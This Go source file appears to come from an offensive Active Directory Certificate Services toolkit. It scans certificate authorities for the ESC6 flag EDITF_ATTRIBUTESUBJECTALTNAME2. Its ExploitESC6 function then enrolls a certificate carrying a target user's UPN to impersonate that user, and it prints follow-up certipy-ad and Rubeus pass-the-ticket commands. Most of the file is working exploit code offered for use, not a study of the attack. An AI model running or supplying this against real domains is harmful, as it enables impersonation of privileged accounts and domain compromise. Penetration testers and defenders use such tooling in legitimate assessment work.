package pki

import (
	"crypto"
	"crypto/x509"
	"fmt"
	"strings"
)

// editfAttributeSubjectAltName2 is the EDITF_ATTRIBUTESUBJECTALTNAME2 flag bit
// in the CA's EditFlags registry value (exposed via the enrollment service's
// flags LDAP attribute). When set, the CA processes SAN extensions from
// certificate request attributes, regardless of the template configuration.
const editfAttributeSubjectAltName2 uint32 = 0x00040000

// ESC6Finding records a CA where EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled —
// allowing any certificate request to include an arbitrary SAN via request
// attributes, bypassing template restrictions.
type ESC6Finding struct {
	CAName       string   `json:"ca_name"`
	CAHostname   string   `json:"ca_hostname"`
	Flags        uint32   `json:"flags"`
	Templates    []string `json:"templates,omitempty"`
}

// ScanESC6 detects ESC6 — CAs where EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled
// in the enrollment service's flags attribute. This CA-level misconfiguration
// allows ANY certificate request to specify an arbitrary Subject Alternative
// Name in the request attributes, regardless of template settings.
//
// Attack flow:
//  1. Attacker finds a CA with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
//  2. Attacker requests a cert and includes a SAN for a target user in request attributes
//  3. The CA processes the SAN attribute and embeds it in the issued certificate
//  4. Attacker authenticates via PKINIT as the target user
func ScanESC6(cfg *ADCSConfig) ([]ESC6Finding, error) {
	fmt.Println("[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA enrollment service)...")

	services, err := EnumerateEnrollmentServices(cfg)
	if err != nil {
		return nil, fmt.Errorf("enumerate enrollment services: %w", err)
	}

	var findings []ESC6Finding
	for _, svc := range services {
		if svc.Flags&editfAttributeSubjectAltName2 != 0 {
			finding := ESC6Finding{
				CAName:     svc.Name,
				CAHostname: svc.DNSHostName,
				Flags:      svc.Flags,
				Templates:  svc.Templates,
			}
			findings = append(findings, finding)
			fmt.Printf("[!] ESC6: CA %q has EDITF_ATTRIBUTESUBJECTALTNAME2 (flags=0x%08X)\n",
				svc.Name, svc.Flags)
			fmt.Printf("[*]   Any request to this CA can include an arbitrary SAN via request attributes\n")
			fmt.Printf("[*]   Hostname: %s\n", svc.DNSHostName)
		}
	}

	if len(findings) == 0 {
		fmt.Println("[*] No ESC6 findings — no CAs with EDITF_ATTRIBUTESUBJECTALTNAME2.")
	} else {
		fmt.Printf("[!] ESC6: %d finding(s) detected\n", len(findings))
	}

	return findings, nil
}

// ExploitESC6 exploits EDITF_ATTRIBUTESUBJECTALTNAME2 on a CA to forge a
// certificate with an arbitrary SAN for the target user. Unlike ESC1/ESC2
// where the template must allow enrollee-supplied subjects, ESC6 works because
// the CA itself processes SAN extensions from request attributes — the SAN is
// injected at the CA level regardless of template configuration.
func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC6 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify a CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
	findings, err := ScanESC6(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC6 scan: %w", err)
	}
	if len(findings) == 0 {
		return nil, nil, fmt.Errorf("no CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 found")
	}

	fmt.Printf("[+] CA %q confirmed ESC6 vulnerable (flags=0x%08X)\n", findings[0].CAName, findings[0].Flags)
	fmt.Printf("[*] SAN will be injected via request attributes (CA-level processing)\n")

	// Step 2: Verify the template exists
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	found := false
	for _, t := range templates {
		if t.Name == templateName {
			found = true
			fmt.Printf("[+] Template %q found (any template works with ESC6)\n", templateName)
			fmt.Printf("[*] Authentication EKU: %v\n", t.AuthenticationEKU)
			fmt.Printf("[*] Manager approval: %v\n", t.RequiresManagerApproval)
			break
		}
	}
	if !found {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	// Step 3: Enroll for a CA-signed certificate with target UPN injected via
	// request attributes. The sanInject=true flag puts the SAN in CertAttrib
	// (SAN:upn=<targetUPN>) rather than in the CSR itself. The CA's EDITF flag
	// causes it to copy the SAN from request attributes into the issued certificate.
	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, true)
	if err != nil {
		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
	}

	upnUser := targetUPN
	if idx := strings.Index(upnUser, "@"); idx > 0 {
		upnUser = upnUser[:idx]
	}
	fmt.Printf("[+] Certificate obtained for %s via ESC6 on CA %q using template %q\n", targetUPN, findings[0].CAName, templateName)
	fmt.Printf("[*] SAN injected via EDITF_ATTRIBUTESUBJECTALTNAME2 CA policy\n")
	fmt.Printf("[*] Next steps:\n")
	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
	fmt.Printf("    # Note: ESC6 works on ANY template — the CA processes the SAN attribute globally\n")
	return cert, certKey, nil
}
